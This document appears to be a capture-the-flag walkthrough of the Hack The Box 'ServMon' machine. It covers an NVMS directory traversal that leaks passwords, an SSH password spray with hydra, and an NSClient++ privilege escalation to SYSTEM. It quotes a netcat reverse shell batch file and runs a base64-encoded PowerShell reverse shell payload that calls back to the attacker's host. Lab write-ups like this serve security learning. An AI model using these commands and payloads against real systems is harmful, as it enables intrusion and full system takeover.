
### Initial access
Access ftp in anonymous to get info 


```bash
┌──(kali㉿kali)-[~/HTB/ServMon]
└─$ cat Confidential.txt        
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine                                                                              
┌──(kali㉿kali)-[~/HTB/ServMon]
└─$ cat Notes\ to\ do.txt 
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint                                                                              
┌──(kali㉿kali)-[~/HTB/ServMon]


```


```
┌──(kali㉿kali)-[~/HTB/ServMon]
└─$ searchsploit NVMS     
-------------------------------------------- ---------------------------------
 Exploit Title                              |  Path
-------------------------------------------- ---------------------------------
NVMS 1000 - Directory Traversal             | hardware/webapps/47774.txt
OpenVms 5.3/6.2/7.x - UCX POP Server Arbitr | multiple/local/21856.txt
OpenVms 8.3 Finger Service - Stack Buffer O | multiple/dos/32193.txt
TVT NVMS 1000 - Directory Traversal         | hardware/webapps/48311.py
-------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                              
┌──(kali㉿kali)-[~/HTB/ServMon]
└─$ searchsploit -m hardware/webapps/47774.txt

  Exploit: NVMS 1000 - Directory Traversal
      URL: https://www.exploit-db.com/exploits/47774
     Path: /usr/share/exploitdb/exploits/hardware/webapps/47774.txt
    Codes: N/A
 Verified: False
File Type: Unicode text, UTF-8 text
Copied to: /home/kali/HTB/ServMon/47774.txt



```

Using path traversal to get cred
 ```
 HTTP/1.1 200 OK
Content-type: text/plain
Content-Length: 156
Connection: close
AuthInfo: 

1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
 ```

We spray the pass with ssh to get access
```
┌──(kali㉿kali)-[~/HTB/ServMon]
└─$ hydra -l nadine -P pass ssh://10.129.227.77
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-31 09:17:49
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task
[DATA] attacking ssh://10.129.227.77:22/
[22][ssh] host: 10.129.227.77   login: nadine   password: L1k3B1gBut7s@W0rk
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-31 09:17:50

┌──(kali㉿kali)-[~/HTB/ServMon]
└─$ ssh nadine@10.129.227.77    

The authenticity of host '10.129.227.77 (10.129.227.77)' can't be established.
ED25519 key fingerprint is SHA256:WctzSeuXs6dqa7LqHkfVZ38Pppc/KRlSmEvNtPlwSoQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.227.77' (ED25519) to the list of known hosts.
nadine@10.129.227.77's password: 
Microsoft Windows [Version 10.0.17763.864]
(c) 2018 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>
nadine@SERVMON C:\Users\Nadine>whoami
servmon\nadine

nadine@SERVMON C:\Users\Nadine>

nadine@SERVMON C:\RecData>dir 
 Volume in drive C has no label. 
 Volume Serial Number is 20C1-47A1

 Directory of C:\RecData

02/28/2022  08:02 PM    <DIR>          .
02/28/2022  08:02 PM    <DIR>          ..
02/28/2022  08:02 PM             8,192 RecordInfoDB.db3
02/28/2022  08:02 PM                 0 RecordInfoDB.db3-journal
               2 File(s)          8,192 bytes
               2 Dir(s)   6,116,048,896 bytes free

nadine@SERVMON C:\RecData>

```

### Priv escalation

Finding ncsclient have ce in local privescalation with authetiacated user `ew2x6SsGTxjRwXOT
` 

```
┌──(kali㉿kali)-[~/HTB/ServMon]
└─$ searchsploit NSClie
-------------------------------------------- ---------------------------------
 Exploit Title                              |  Path
-------------------------------------------- ---------------------------------
NSClient++ 0.5.2.35 - Authenticated Remote  | json/webapps/48360.txt
NSClient++ 0.5.2.35 - Privilege Escalation  | windows/local/46802.txt
-------------------------------------------- ---------------------------------
Shellcodes: No Results
                            

┌──(kali㉿kali)-[~/HTB/ServMon]
└─$ cat 46802.txt 
Exploit Author: bzyo
Twitter: @bzyo_
Exploit Title: NSClient++ 0.5.2.35 - Privilege Escalation
Date: 05-05-19
Vulnerable Software: NSClient++ 0.5.2.35
Vendor Homepage: http://nsclient.org/
Version: 0.5.2.35
Software Link: http://nsclient.org/download/
Tested on: Windows 10 x64

Details:
When NSClient++ is installed with Web Server enabled, local low privilege users have the ability to read the web administator's password in cleartext from the configuration file.  From here a user is able to login to the web server and make changes to the configuration file that is normally restricted.

The user is able to enable the modules to check external scripts and schedule those scripts to run.  There doesn't seem to be restrictions on where the scripts are called from, so the user can create the script anywhere.  Since the NSClient++ Service runs as Local System, these scheduled scripts run as that user and the low privilege user can gain privilege escalation.  A reboot, as far as I can tell, is required to reload and read the changes to the web config.

Prerequisites:
To successfully exploit this vulnerability, an attacker must already have local access to a system running NSClient++ with Web Server enabled using a low privileged user account with the ability to reboot the system.

Exploit:
1. Grab web administrator password
- open c:\program files\nsclient++\nsclient.ini
or
- run the following that is instructed when you select forget password
        C:\Program Files\NSClient++>nscp web -- password --display
        Current password: SoSecret

2. Login and enable following modules including enable at startup and save configuration
- CheckExternalScripts
- Scheduler

3. Download nc.exe and evil.bat to c:\temp from attacking machine
        @echo off
        c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe

4. Setup listener on attacking machine
        nc -nlvvp 443

5. Add script foobar to call evil.bat and save settings
- Settings > External Scripts > Scripts
- Add New
        - foobar
                command = c:\temp\evil.bat

6. Add schedulede to call script every 1 minute and save settings
- Settings > Scheduler > Schedules
- Add new
        - foobar
                interval = 1m
                command = foobar

7. Restart the computer and wait for the reverse shell on attacking machine
        nc -nlvvp 443
        listening on [any] 443 ...
        connect to [192.168.0.163] from (UNKNOWN) [192.168.0.117] 49671
        Microsoft Windows [Version 10.0.17134.753]
        (c) 2018 Microsoft Corporation. All rights reserved.

        C:\Program Files\NSClient++>whoami
        whoami
        nt authority\system

Risk:
The vulnerability allows local attackers to escalate privileges and execute arbitrary code as Local System       
```

We ssh tunneling to get reverse shell we use 48360.txt to execute
```
ssh -L 8443:127.0.0.1:8443 nadine@10.129.33.38

┌──(kali㉿kali)-[~/HTB/ServMon]
└─$ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.15.143] from (UNKNOWN) [10.129.33.38] 49876

┌──(kali㉿kali)-[~/HTB/ServMon]
└─$ python exp.py -t 127.0.0.1 -P 8443 -p ew2x6SsGTxjRwXOT -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMQA0ADMAIgAsADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
[!] Targeting base URL https://127.0.0.1:8443
[!] Obtaining Authentication Token . . .
[+] Got auth token: frAQBc8Wsa1xVPfvJcrgRYwTiizs2trQ
[!] Enabling External Scripts Module . . .
[!] Configuring Script with Specified Payload . . .
[+] Added External Script (name: whPJbEfHMKxw)
[!] Saving Configuration . . .
[!] Reloading Application . . .
[!] Waiting for Application to reload . . .
[!] Obtaining Authentication Token . . .
[+] Got auth token: frAQBc8Wsa1xVPfvJcrgRYwTiizs2trQ
[!] Triggering payload, should execute shortly . . .

[!] Timeout exceeded. Assuming your payload executed . . .


PS C:\Program Files\NSClient++> whoami
nt authority\system
PS C:\Program Files\NSClient++> 





```
### Post exploit